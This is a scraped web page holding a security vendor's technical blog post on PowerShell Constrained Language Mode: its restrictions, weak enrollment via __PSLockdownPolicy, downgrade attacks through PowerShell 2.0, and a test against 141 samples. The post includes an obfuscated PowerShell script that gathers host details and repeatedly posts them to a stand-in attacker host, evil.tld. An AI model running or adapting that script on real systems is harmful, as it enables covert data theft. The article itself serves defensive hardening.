4.92149239,7.30085217 6.05809022,7.30085217 C7.19468804,7.30085217 8.11619891,6.37952609 8.11619891,5.24292826 C8.11619891,4.10614565 7.19468804,3.18481957 6.05809022,3.18481957 Z" id="Combined-Shape"></path></g></g></svg></div></button></a><a class="css-18hi9tf"><button aria-label="twitter" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="sns/twitter/hover" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="dark" d="M3,0 L21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 Z M9.40543979,19.2 C15.5354921,19.2 18.8873246,14.1204188 18.8873246,9.71811518 C18.8873246,9.57298429 18.8873246,9.4278534 18.8804136,9.28963351 C19.5300471,8.81968586 20.0967487,8.23225131 20.5459634,7.56188482 C19.9516178,7.82450262 19.3088953,8.00418848 18.6316178,8.08712042 C19.3227173,7.67246073 19.8479529,7.02282723 20.0967487,6.24188482 C19.4540262,6.62198953 18.7421937,6.89842932 17.9819843,7.0504712 C17.3738168,6.4008377 16.5099424,6 15.5493141,6 C13.7109895,6 12.2182147,7.49277487 12.2182147,9.33109948 C12.2182147,9.59371728 12.2458586,9.84942408 12.3080576,10.0913089 C9.53674869,9.95308901 7.08334555,8.62617801 5.4385288,6.60816754 C5.15517801,7.09884817 4.98931414,7.67246073 4.98931414,8.28062827 C4.98931414,9.4347644 5.57674869,10.4575916 6.47517801,11.0519372 C5.92920942,11.0381152 5.41779581,10.8860733 4.96858115,10.6372775 C4.96858115,10.6510995 4.96858115,10.6649215 4.96858115,10.6787435 C4.96858115,12.2959162 6.11580628,13.6366492 7.64313613,13.947644 C7.36669634,14.0236649 7.06952356,14.0651309 6.76543979,14.0651309 C6.55119895,14.0651309 6.34386911,14.0443979 6.13653927,14.0029319 C6.55810995,15.3298429 7.78826702,16.2904712 9.24648691,16.3181152 C8.10617277,17.2096335 6.66868586,17.7417801 5.10680105,17.7417801 C4.83727225,17.7417801 4.57465445,17.7279581 4.31203665,17.6934031 C5.77025654,18.6471204 7.52564921,19.2 9.40543979,19.2"></path></g></svg></div></button></a><a class="css-18hi9tf"><button aria-label="facebook" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24" version="1.1"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="dark" d="M22,0 C23.1045695,-2.02906125e-16 24,0.8954305 24,2 L24,22 C24,23.0543618 23.1841222,23.9181651 22.1492623,23.9945143 L22,24 L22,24 L14,24 L14,23.978 L13.875,24 L13.875,15.5633307 L16.6710937,15.5633307 L17.203125,12.0733717 L13.875,12.0733717 L13.875,9.80860051 C13.875,8.85381375 14.3398828,7.92315016 15.8305781,7.92315016 L15.8305781,7.92315016 L17.34375,7.92315016 L17.34375,4.95196885 C17.34375,4.95196885 15.9704766,4.71616081 14.6575781,4.71616081 C11.9165156,4.71616081 10.125,6.3875682 10.125,9.41345698 L10.125,9.41345698 L10.125,12.0733717 L7.078125,12.0733717 L7.078125,15.5633307 L10.125,15.5633307 L10.125,24 C10.0832306,23.9934058 10.0415327,23.9865949 9.99990751,23.9795684 L10,24 L2,24 C0.8954305,24 1.3527075e-16,23.1045695 0,22 L0,2 C-1.3527075e-16,0.8954305 0.8954305,2.02906125e-16 2,0 L22,0 Z" id="path-1"></path></g></svg></div></button></a></div></div></div><div class="css-vkmg7y"></div></div></div><div class="css-m5kad0"><div class="css-1xf4lef default"></div><div class="css-1d0bkbk default"></div></div></div><div class="css-yx8k1m"><div class="css-k48dnj"><style data-emotion="css 10f0b8k">.css-10f0b8k{width:100%;height:100%;max-height:80vh;}</style><img src="" class="css-10f0b8k"/><div class="css-2eb87j"><svg height="10" viewBox="0 0 10 10" width="10"><defs><path id="a" d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path><mask id="b" fill="#fff"><use fill="#fff" fill-rule="evenodd" xlink:href="#a"></use></mask></defs><g fill="#f5f2e9" fill-rule="evenodd" transform="translate(-.333333 -.333333)"><use xlink:href="#a"></use><g mask="url(#b)"><path d="m0 0h16v16h-16z" transform="translate(-2.666667 -2.666667)"></path></g></g></svg></div></div></div></main><footer class="css-1j4sz91"><div class="css-1rid8u3"><div class="css-mp3uzg"><svg width="84px" height="84px" viewBox="0 0 84 84"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="footer-tmp/nor" transform="translate(-1166.000000, 0.000000)"><g id="footer/nor"><g id="Top" transform="translate(1166.000000, 0.000000)"><g id="scroll"><polygon id="Rectangle" fill="#d93751" points="42 0 84 42 42 84 0 42"></polygon><path d="M57,56.7989281 L42,70.9217351 L27,56.7989281 M42,70.9217351 L42.5,39.9444444" id="Combined-Shape" stroke="#FFFFFF" stroke-linecap="round" stroke-linejoin="round" transform="translate(42.000000, 55.222222) scale(1, -1) translate(-42.000000, -55.222222) "></path><text id="TOP" font-family="NotoSansCJKtc-Light, Noto Sans CJK TC" font-size="12" font-weight="300" fill="#FFFFFF"><tspan x="30.612" y="32">TOP</tspan></text></g></g></g></g></g></svg></div></div><div class="css-1742rmd"><a class="css-1xlcuzt" href="/tw/"><img src="/images/logo_contact.svg" alt=""/></a><div class="css-4qsnzi"><div class="css-tu40hi"><div class="css-9tw39e disable"><a href="/twundefined"><style data-emotion="css h6a8fj">.css-h6a8fj{display:-webkit-box;display:-webkit-unset;display:-ms-unsetbox;display:unset;cursor:pointer;margin:0;color:#4c433f;font-size:14px;font-weight:bold;}</style><h6 class="css-1o9043k css-h6a8fj">解決方案</h6></a></div><div class="css-ipgxcm"><div class="css-cssveg"><a href="/tw/products/threatsonar"><div class="css-1bu2g12">ThreatSonar</div></a></div><div class="css-cssveg"><a href="/tw/products/threatvision"><div class="css-1bu2g12">ThreatVision</div></a></div></div></div><div class="css-tu40hi"><div class="css-9tw39e disable"><a href="/twundefined"><style data-emotion="css h6a8fj">.css-h6a8fj{display:-webkit-box;display:-webkit-unset;display:-ms-unsetbox;display:unset;cursor:pointer;margin:0;color:#4c433f;font-size:14px;font-weight:bold;}</style><h6 class="css-1o9043k css-h6a8fj">關於 TeamT5</h6></a></div><div class="css-ipgxcm"><div class="css-cssveg"><a href="/tw/about-us"><div class="css-1bu2g12">TeamT5 團隊</div></a></div><div class="css-cssveg"><a href="/tw/careers"><div class="css-1bu2g12">人才招募</div></a></div></div></div><div class="css-tu40hi"><div class="css-9tw39e"><a href="/tw/news-and-events"><style data-emotion="css h6a8fj">.css-h6a8fj{display:-webkit-box;display:-webkit-unset;display:-ms-unsetbox;display:unset;cursor:pointer;margin:0;color:#4c433f;font-size:14px;font-weight:bold;}</style><h6 class="css-1o9043k css-h6a8fj">最新消息</h6></a></div></div><div class="css-tu40hi"><div class="css-9tw39e"><a href="/tw/blog"><style data-emotion="css h6a8fj">.css-h6a8fj{display:-webkit-box;display:-webkit-unset;display:-ms-unsetbox;display:unset;cursor:pointer;margin:0;color:#4c433f;font-size:14px;font-weight:bold;}</style><h6 class="css-1o9043k css-h6a8fj">部落格</h6></a></div></div><div class="css-tu40hi"><div class="css-9tw39e disable"><a href="/twundefined"><style data-emotion="css h6a8fj">.css-h6a8fj{display:-webkit-box;display:-webkit-unset;display:-ms-unsetbox;display:unset;cursor:pointer;margin:0;color:#4c433f;font-size:14px;font-weight:bold;}</style><h6 class="css-1o9043k css-h6a8fj">聯絡我們</h6></a></div><div class="css-ipgxcm"><div class="css-cssveg"><a href="/tw/request-information"><div class="css-1bu2g12">索取資訊</div></a></div><div class="css-cssveg"><a href="/tw/become-a-partner"><div class="css-1bu2g12">成為合作夥伴</div></a></div></div></div></div></div><hr/><div class="css-f24dyb"><div class="css-vx1whx"><a class="css-nagi7g" href="/tw/privacy-and-cookies-policy">隱私權與Cookies使用政策</a><a class="css-nagi7g" href="/tw/terms-of-service">服務條款</a><a class="css-nagi7g" href="/tw/security-policy">資訊安全政策</a><div class="css-nagi7g disable">© 2020 TEAM T5, Inc. All Rights Reserved.</div></div><div class="css-1v3z295"><div class="css-cksic1"><select><option value="en">English</option><option selected="" value="tw">繁體中文</option><option value="jp">日本語</option></select><svg width="8px" height="4px" viewBox="0 0 8 4" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="footer/nor" transform="translate(-1227.000000, -341.000000)" fill="#4c433f"><g transform="translate(1170.000000, 333.000000)"><polygon id="Triangle" transform="translate(61.000000, 10.000000) scale(1, -1) translate(-61.000000, -10.000000) " points="61 8 65 12 57 12"></polygon></g></g></g></svg></div></div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"publish":true,"enable_form":false,"tags":[{"_id":"6018b953c56e80003f9859cb","name":"PowerShell","createdAt":"2021-02-02T02:30:43.906Z","updatedAt":"2021-02-02T03:54:49.732Z","__v":0,"id":"6018b953c56e80003f9859cb"},{"_id":"6018ccf4c56e80003f9859cc","name":"Constrained Language Mode","createdAt":"2021-02-02T03:54:28.919Z","updatedAt":"2021-02-05T02:54:38.296Z","__v":0,"id":"6018ccf4c56e80003f9859cc"}],"relative_posts":[],"_id":"6017c9aac56e80003f9859ba","post_url":"a-deep-dive-into-powershell-s-constrained-language-mode","post_name":"A Deep Dive into PowerShell's Constrained Language Mode","contents":[{"locale":"en","_id":"6017c9aac56e80003f9859bb","title":"A Deep Dive into PowerShell's Constrained Language Mode","context":"*Image courtesy of [Pexels](https://www.pexels.com/zh-tw/photo/3803517/)\n\n## What is Constrained Language Mode and Why it Matters\n\nWhen PowerShell was [first announced in 2006](https://betanews.com/2006/11/14/windows-powershell-1-0-released/), it was meant to be a flexible command-line shell that features an easy-to-understand yet advanced scripting engine for IT admins. Fast forward to (almost) a decade and a half later, PowerShell has caught up in popularity and has superseded the now-legacy `cmd.exe` in current Windows 10 releases.\n\nHowever, PowerShell has also been weaponized heavily over the past decade. There is an abundance of PowerShell-based samples all over public sandboxes, and [APTs are known to abuse it whenever possible](https://attack.mitre.org/techniques/T1059/001/). The advanced scripting engine is often utilized to launch fileless/in-memory attacks or [use it as a way around AMSI](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/). In this post, we will be focusing on a lesser-known feature that can be used to combat this threat: Language Mode.\n\nPowerShell was launched with an option to change its [\"Language Mode\"](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes). This Language Mode option allows the user to switch between syntaxes allowed or disallowed. By default, all PowerShell sessions are launched with `FullLanguage`, which permits all the available syntaxes and cmdlets at runtime. There are four total language modes available: `FullLanguage`, `RestrictedLanguage`, `NoLanguage` and finally `ConstrainedLanguage`. In today's topic, we are here to focus on the `ConstrainedLanguage` mode introduced in PowerShell 3.0.\n\n\u003cbr\u003e\n\n### Safer PowerShell Environment\n\nFirst off, let's take a look at what Microsoft Docs says about the `ConstrainedLanguage` mode:\n\n\u003e - All cmdlets in Windows modules, and other UMCI-approved cmdlets, are fully functional and have complete access to system resources, except as noted.\n\u003e - All elements of the PowerShell scripting language are permitted.\n\u003e - All modules included in Windows can be imported and all commands that the modules export run in the session.\n\u003e - In PowerShell Workflow, you can write and run script workflows (workflows written in the PowerShell language). XAML-based workflows are not supported and you cannot run XAML in a script workflow, such as by using Invoke-Expression -Language XAML. Also, workflows cannot call other workflows, although nested workflows are permitted.\n\u003e - The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.\n\u003e - The New-Object cmdlet can be used only on allowed types (listed below).\n\u003e - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.\n\u003e - Type conversion is permitted, but only when the result is an allowed type.\n\u003e - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.\n\u003e - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.\n\u003e - Users can get all properties of allowed types. Users can set the values of properties only on Core types. Only the following COM objects are permitted:\n\u003e   - Scripting.Dictionary\n\u003e   - Scripting.FileSystemObject\n\u003e   - VBScript.RegExp\n\n\u003cbr\u003e\n\n#### No Arbitrary C# Code via Add-Type\n\n\u003e The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.\n\nMany PowerShell-based exploits rely on .NET-based language compilation via `Add-Type` - and that's already thrown out the window by disallowing arbitrary C# code compilation.\n\n![202101-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_1_38111256c4.png)\n\n\u003cbr\u003e\n\n#### Non-whitelisted Types are Prohibited\n\n\u003e - The New-Object cmdlet can be used only on allowed types (listed below).\n\u003e - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.\n\u003e - Type conversion is permitted, but only when the result is an allowed type.\n\u003e - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.\n\u003e - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.\n\nIn laymen's terms, every non-whitelisted type and its methods/properties are blocked from execution. Classes such as `System.Reflection.Assembly`/`System.Convert`/`System.Runtime.CompilerServices` and many more are out-of-reach for threat actors, making code injection or fileless attacks that rely on additional PEs much more difficult.\n\n![202101-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_2_ec73ef8561.png)\n\n\u003cbr\u003e\n\n### Prohibit Complex Scripts from Executing\n\nGiven the above limitations, this does mean that legitimate complex scripts may not be able to execute correctly. For instance, if your organization uses a script that utilizes WinForm or WPF (Windows Presentation Framework), those will not work at all.\n\n![202101-3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_3_80ad190a95.png)\n\nConsequentially, modules are affected by this whitelisting system as well. Modules that rely on created types or non-whitelisted type calls will not load properly.\n\n![202101-4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_4_aa876d7833.png)\n\nTherefore, it is crucial to **double-check your organization's scripts** (if you have any) *before* enrolling this policy to your endpoints.\n\n\u003cbr\u003e\n\n### Require Explicit Feature Enrollment\n\nSince, by default, this language mode is an opt-in feature, the user would either have to call `$ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\"` at the beginning of each session or add `__PSLockdownPolicy` to the system environment variables (**DO NOT** do this for production. [See the section below](#beware-of-pslockdownpolicy). Neither of which is ideal and should only be used for debugging, unit testing, or for general testing purposes only.\n\nInstead, the administrator(s) of your organization should deploy via WDAC (Windows Defender Application Control) on Windows 10+ *or* via AppLocker on Windows 7+. When implemented this way, the attacker will first have to bypass WDAC or AppLocker before gaining full control of a standard PowerShell session. A guideline regarding the deployment for individual or mass number of endpoints can be found under the [Application Control for Windows](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control) article on Microsoft Docs.\n\n\u003cbr\u003e\n\n### Effective Against Scripts, not Standard Cmdlets\n\nIt must be made clear that merely enabling Constrained Language Mode is not enough to mitigate the risks PowerShell can bring. While restricting users to a lower-privileged language mode ensures no custom .NET assemblies or code can be executed, this does not stop attackers from crafting malicious scripts from the built-in cmdlets alone. For example, an attacker may still be able to craft a script that collects relevant intel about the computer and send it back to their C2 station.\n\nThe following, as an example, will continue to run fine under a PowerShell session with Constrained Language mode enabled.\n\n```ps1\nStart-Job -ScriptBlock {\n while($true){\n  # MAC address collection\n  .(\"{1}{3}{2}{0}\" -f 'ariable', 'S', 't-V', 'e') -Name (\"{1}{0}\" -f 'ata', 'd') -Value (.(\"{3}{2}{0}{1}\" -f 'Ada', 'pter', 'Net', 'Get-') | .(\"{1}{0}\" -f 'ect', 'sel') (\"{1}{0}{3}{2}\" -f 'erfac', 'Int', 's', 'eAlia'), (\"{0}{1}{2}\" -f 'MacA', 'd', 'dress') | \u0026(\"{3}{2}{0}{1}\" -f 'r', 'tTo-Json', 'e', 'Conv') -Compress) \u003e $null\n  # OSs + username collection\n  .(\"{2}{0}{1}\" -f '-', 'Variable', 'Set') -Name (\"{0}{1}\" -f 'd', 'ata') -Value (${D`ATa} + (.(\"{0}{2}{3}{1}\" -f 'Ge', 'nce', 't-CimInst', 'a') (\"{1}{0}{3}{2}\" -f 'ting', 'Win32_Opera', 'em', 'Syst') | .(\"{0}{1}\" -f 'se', 'lect') (\"{0}{1}\" -f 'na', 'me'), (\"{1}{0}\" -f 'me', 'CSNa') | \u0026(\"{2}{3}{1}{0}{4}\" -f 'o-Js', 'T', 'Conve', 'rt', 'on') -Compress)) \u003e $null\n  # WAN IP collection\n  \u0026(\"{0}{1}{2}{3}\" -f 'Set-', 'Vari', 'abl', 'e') -Name (\"{1}{0}\" -f 'ta', 'da') -Value (${D`AtA} + ((.(\"{1}{0}\" -f 'r', 'iw') -useb (\"{1}{0}{2}\" -f 'fig', 'ifcon', '.me') -user (\"{0}{1}\" -f 'cur', 'l')).\"cO`NTe`Nt\")) \u003e $null\n  # Saves data to a temporary file (usually this is done in-memory by threat actors, but in-memory execution purely based on existing cmdlets is either impossible or very difficult)\n  .(\"{1}{0}{2}\" -f '-Variabl', 'Set', 'e') -Name ('a') -Value (\"$env:temp\\$(New-Guid).txt\")\n  ${Da`Ta} | \u0026(\"{1}{2}{0}\" -f 'le', 'O', 'ut-Fi') ${a}\n  # Compresses the file\n  \u0026(\"{3}{0}{2}{1}\" -f 'ompr', 'Archive', 'ess-', 'C') -De \"$a.zip\" -Co (\"{0}{1}\" -f 'Op', 'timal') -Lit ${a}\n  # Sends it back to the C2 station\n  \u0026(\"{1}{0}\" -f 'r', 'iw') (\"{0}{2}{3}{4}{1}\" -f 'h', '00', 'ttp://evil', '.tld:', '80') -method (\"{1}{0}\" -f 'st', 'po') -body (.(\"{1}{0}{2}\" -f 'Co', 'Get-', 'ntent') -Lit \"$a.zip\") \u003e $null\n  \u0026(\"{2}{1}{0}\" -f 'leep', 't-S', 'Star') -Seconds 2\n  }\n}\n```\n\nAdditionally, attackers may still be able to call external resources to achieve their goal, such as achieving persistence via `schtask` or placing additional payloads under `shell:startup`. Remember, Constrained Language mode does **NOT** block most existing cmdlets from functioning; in other words, it limits what the threat actor has on their disposal, but does not mean that they cannot make do with vanilla cmdlets or standard Windows applications.\n\n\u003cbr\u003e\n\n#### Beware of `__PSLockdownPolicy`\n\nAside from weaponizing existing cmdlets, if the admins had \"enabled\" the language feature via `__PSLockdownPolicy`, then it would be trivial for attackers with administrative privileges to restore the language policy. Let's take a look at what this environment variable actually does.\n\n![202101-5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_5_707aff90b6.png)\n\nWe'll see that it has brought us to the `SystemPolicy` class under the `wldpNativeMethods.cs` file. In various articles that reference this environment variable, they would instruct the administrator to set the `__PSLockdownPolicy` variable to `4`. A value of 4 corresponds with the `WLDP_LOCKDOWN_UMCIENFORCE_FLAG` constant, which indicates the enforcement of UMCI (User-mode Code Integrity).\n\n![202101-6.gif](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230069/202101_6_2a4f7bdb5c.gif)\n\nThe call's parent method happens to be named `GetDebugLockdownPolicy`, which indicates that this behavior was meant to be a debug feature, rather than something that should be in a production environment.\n\n![202101-7.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230072/202101_7_4f3622def2.png)\n\nThis theory is further backed up by the statement made by [Matt Graeber](https://twitter.com/mattifestation/status/921509830644269062), a renowned security researcher well-versed in WDAC. Further research also shows this behavior was mentioned by the PowerShell team in its [official post regarding Constrained Language Mode as well](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/):\n\n\u003e As part of the implementation of Constrained Language, PowerShell included an environment variable for debugging and unit testing called `__PSLockdownPolicy`. While we have never documented this, some have discovered it and described this as an enforcement mechanism. This is unwise because an attacker can easily change the environment variable to remove this enforcement. In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.\n\nIt must be emphasized that administrators should **NOT** deploy this to their endpoints as a way to enable Constrained Language mode - and be extra mindful when reading through articles regarding security features.\n\n\u003cbr\u003e\n\n### Compatibility with Legacy OSs\n\nAnother thing to consider before rolling this feature out to endpoints is legacy OSs. As mentioned at the beginning of this post, Constrained Language mode is only available on PowerShell 3.0 onwards - and Windows 7 ships with PowerShell 2.0 by default.\n\n![202101-8.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230074/202101_8_6103f884e7.png)\n\nWhile it is possible to install WMF 5.1 on older systems such as Windows 7, these systems likely ship with PowerShell 2.0 as its core component as well, which is susceptible to *downgrade attacks*.\n\nAll the attacker needs to do is, instead of starting a standard PowerShell 5.1 session, spawn a PowerShell 2.0 session using `PowerShell.exe -Version 2`. Since `ConstrainedLanguage` mode doesn't exist in that version, it will simply fallback to using `FullLanguage`.\n\n![202101-9.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230075/202101_9_7d51c2552d.png)\n\nThis is much less of a problem on Windows 10, as PowerShell 5.1 is shipped with the system by default and 2.0 can be removed by using `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`. After then, any attempts to launch PowerShell v2 will result in an error message.\n\n```text\nPS C:\\\u003e powershell -v 2\nEncountered a problem reading the registry.  Cannot find registry key SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine. The Windows PowerShell 2 engine is not installed on this computer.\n```\n\n\u003cbr\u003e\n\n## Hypothetical Testing\n\nTo see how effective this mode is against hypothetical attacks, we ...\n\n- gathered 141 recently-submitted unique PowerShell samples as of Jan 27th, 2021.\n  - These samples were randomly chosen and were not handpicked (aside from picking out invalid samples that aren't `*.ps1` scripts) in any way.\n- executed the scripts via `ls -File | %{start-job -scr {iex $args[0]} -arg $_.FullName}`.\n- ran these samples on a system with `ConstrainedLanguage` mode enabled.\n- ran these samples on a Windows 10 (build 19042) system with a non-elevated PowerShell session.\n  - Elevation is taken out of the equation as attackers would have to escalate its privilege first, and by that point there will be bigger problems to worry about.\n\n![202101-10.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230077/202101_10_0e10676b7f.png)\n\n\u003cbr\u003e\n\nIn our testing,\n\n- `ConstrainedLanguage` blocked ...\n  - 100% (141/141) of the samples from executing properly.\n    - ... as in reaching their intended goal of launching a TCP shell, loading its next-stage payload, creating usable persistence, etc.\n  - 51% (72/141) of the samples that had attempted to create a non-whitelisted type.\n  - 50% (71/141) of the samples that had attempted to invoke a method on non-whitelisted type.\n  - 26.9% (38/141) of the samples that had attempted to convert a value into a non-whitelisted type.\n  - 2.8% (4/141) of the samples that had attempted to set a property on a non-whitelisted type.\n- `ConstrainedLanguage` failed to block ...\n  - 0.7% (1/141) of the samples that had managed to create persistence entries.\n\n\u003cbr\u003e\n\n## Conclusion\n\nSince PowerShell is now [an integral part](https://support.microsoft.com/en-us/windows/powershell-is-replacing-command-prompt-fdb690cf-876c-d866-2124-21b6fb29a45f) of modern Windows OSs, sysadmins should not underestimate the risks that PowerShell can bring to the organization.\n\nIn the article, we went through the benefits and drawbacks of `ConstrainedLanguage` and how it performs in a hypothetical test. By enabling the engine feature, the risk of PowerShell-introduced exploitation is greatly lowered - if enrolled properly. Organizations should also consider whether or not the reduced availability of modules and or scripts is worth the tradeoff before enrolling this language policy.\n\n\u003cbr\u003e\n","__v":0,"id":"6017c9aac56e80003f9859bb"}],"createdAt":"2021-02-01T09:28:10.609Z","updatedAt":"2021-02-17T01:50:50.646Z","__v":1,"author":{"confirmed":true,"blocked":false,"_id":"5eeae9e3163518003f86d917","username":"Cyber Threat Intelligence","email":"CTI@example.com","provider":"local","createdAt":"2020-06-18T04:13:23.063Z","updatedAt":"2020-06-19T03:42:43.966Z","__v":0,"role":"5e467d0375f9d7007998aebf","id":"5eeae9e3163518003f86d917"},"topic":{"category":"blogs","_id":"5ecaa004a792d70040a0d8b0","color":"#64cda2","name":"Technical Analysis","createdAt":"2020-05-24T16:25:40.461Z","updatedAt":"2020-06-07T22:08:04.525Z","__v":0,"contents":[{"locale":"en","_id":"5edd6544bf58af004a15410d","text":"Technical Analysis","createdAt":"2020-06-07T22:08:04.247Z","updatedAt":"2020-06-07T22:08:04.247Z","__v":0,"id":"5edd6544bf58af004a15410d"},{"locale":"tw","_id":"5edd6544bf58af004a15410e","text":"技術分析","createdAt":"2020-06-07T22:08:04.247Z","updatedAt":"2020-06-07T22:08:04.247Z","__v":0,"id":"5edd6544bf58af004a15410e"},{"locale":"jp","_id":"5edd6544bf58af004a15410f","text":"技術分析","createdAt":"2020-06-07T22:08:04.248Z","updatedAt":"2020-06-07T22:08:04.248Z","__v":0,"id":"5edd6544bf58af004a15410f"}],"id":"5ecaa004a792d70040a0d8b0"},"publish_date":"2021-02-17T02:00:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1612249236/pexels_brett_sayles_3803517_1c8f3c2bfa.jpg","been_relative_posts":[],"id":"6017c9aac56e80003f9859ba"}},"__N_SSG":true},"page":"/[lang]/posts/[uid]","query":{"lang":"tw","uid":"a-deep-dive-into-powershell-s-constrained-language-mode"},"buildId":"yZH7uzr0jnSd-VRHt_pM1","runtimeConfig":{"env":"production","baseUrl":"https://teamt5.org/","cmsUrl":"https://official-cms.teamt5.net/"},"isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html></html>